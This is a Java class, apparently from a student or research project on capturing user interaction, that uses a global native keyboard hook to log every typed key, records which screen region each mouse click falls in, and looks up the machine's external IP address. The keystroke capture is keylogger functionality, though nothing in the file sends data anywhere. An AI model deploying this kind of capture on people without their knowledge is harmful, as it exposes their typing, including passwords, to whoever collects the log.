package ufs.capturate;

import java.awt.Point;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseInputListener;

public class UFScapturate implements NativeMouseInputListener, NativeKeyListener{
	
	public static Point mouses = null;
	public static String mouse = "";
	public static String var = "";
	public static String varchar = "";
	
	public UFScapturate(){}
	
	//Método para pegar o ip externo
	public static String getIp() throws IOException{
		String ip = "Não definido";
		URL myIp = new URL("http://checkip.amazonaws.com");
		BufferedReader in = null;
		in = new BufferedReader(new InputStreamReader(myIp.openStream()));
		ip = in.readLine();
		in.close();
		return ip;
	}
	
	/*Métodos do NativeKeyListener implementados
	pra pegar o teclado digitado*/
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		if(e.getKeyCode() == NativeKeyEvent.VK_1){
			var = "1";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_2){
			var = "2";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_3){
			var = "3";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_4){
			var = "4";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_5){
			var = "5";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_6){
			var = "6";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_7){
			var = "7";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_8){
			var = "8";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_9){
			var = "9";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_0){
			var = "0";
		}
		
		if(e.getKeyCode() == NativeKeyEvent.VK_SPACE){
			var = "  ";
		}
		
		if(e.getKeyCode() == NativeKeyEvent.VK_ENTER){
			var = "<br>";
		}
		
		if(e.getKeyCode() == NativeKeyEvent.VK_BACK_SPACE){
			var = "[backspace]";
		}
		
		if(e.getKeyCode() == NativeKeyEvent.VK_TAB){
			var = "[tab]";
		}
		
		if(e.getKeyCode() == NativeKeyEvent.VK_COMMA){
			var = ",";
		}
		
		if(e.getKeyCode() == NativeKeyEvent.VK_PERIOD){
			var = ".";
		}
		
		if(e.getKeyCode() == NativeKeyEvent.VK_UP){
			var = "[cima]";
		}
		
		if(e.getKeyCode() == NativeKeyEvent.VK_DOWN){
			var = "[baixo]";
		}
		
		if(e.getKeyCode() == NativeKeyEvent.VK_LEFT){
			var = "[esquerda]";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_RIGHT){
			var = "[direita]";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_CAPS_LOCK){
			var = "[capslock]";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_DELETE){
			var = "[delete]";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_INSERT){
			var = "[insert]";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_ADD){
			var = "+";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_SUBTRACT){
			var = "-";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_DIVIDE){
			var = "/";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_MULTIPLY){
			var = "*";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_EQUALS){
			var = "=";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_BACK_SLASH){
			var = "\\";
		}
		
		if(e.getKeyCode() == NativeKeyEvent.VK_SLASH){
			var = "/";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_A){
			var = "a";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_B){
			var = "b";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_C){
			var = "c";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_D){
			var = "d";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_E){
			var = "e";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_F){
			var = "f";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_G){
			var = "g";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_H){
			var = "h";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_I){
			var = "i";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_J){
			var = "j";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_K){
			var = "k";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_L){
			var = "l";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_M){
			var = "m";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_N){
			var = "n";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_O){
			var = "o";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_P){
			var = "p";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_Q){
			var = "q";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_R){
			var = "r";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_S){
			var = "s";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_T){
			var = "t";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_U){
			var = "u";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_V){
			var = "v";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_W){
			var = "w";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_X){
			var = "y";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_Y){
			var = "x";
		}
		if(e.getKeyCode() == NativeKeyEvent.VK_Z){
			var = "z";
		}
		
		
		
		
		varchar += var;
		
		
	}
	


	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}
	
	/*Métodos do NativeMouseInputListener implementados
	pra pegar as posições do mouse*/
	@Override
	public void nativeMouseClicked(NativeMouseEvent arg0) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void nativeMousePressed(NativeMouseEvent input) {
		mouses = input.getPoint();
		double positionx = mouses.getX();
		double positiony = mouses.getY();
		String position = "";
		String position1 = "";
		if(positionx < 70 & positiony < 70){
			position = "canto esquerdo(cabeçalho),";
			position1 = "(topo, esquerda)";
			mouse += position+position1 + "\r\n";
			}
		if(positionx < 170 & positiony > 600){
			position = "canto esquerdo(Rodapé),";
			position1 = "(rodapé, esquerda)";
			mouse += position+position1 + "\r\n";
			}
		if(positionx < 170 & positiony > 190){
			position = "lateral esquerda,";
			position1 = "(meio, esquerda)";
			mouse += position+position1 + "\r\n";
			}
		if(positionx > 170 & positiony > 190 & positionx < 300 & positiony < 300){
			position = "Centro da página,";
			position1 = "(meio, próximo ao topo e esquerda)";
			mouse += position+position1 + "\r\n";
			}				
		if(positionx > 270 & positiony > 400 & positionx < 400){
			position = "Centro da página,";
			position1 = "(meio, próximo ao rodapé e esquerda)";
			mouse += position+position1 + "\r\n";
			}
		if(positionx > 170 & positiony < 190){
			position = "Topo da página(cabeçalho),";
			position1 = "(topo, próximo à esquerda)";
			mouse += position+position1 + "\r\n";
			}
		if(positionx > 400 & positiony < 190){
			position = "Topo da página(cabeçalho),";
			position1 = "(topo, próximo à direita)";
			mouse += position+position1 + "\r\n";
			}
		
		
	}

	@Override
	public void nativeMouseReleased(NativeMouseEvent arg0) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void nativeMouseDragged(NativeMouseEvent arg0) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void nativeMouseMoved(NativeMouseEvent arg0) {
		// TODO Auto-generated method stub
		
	}
}
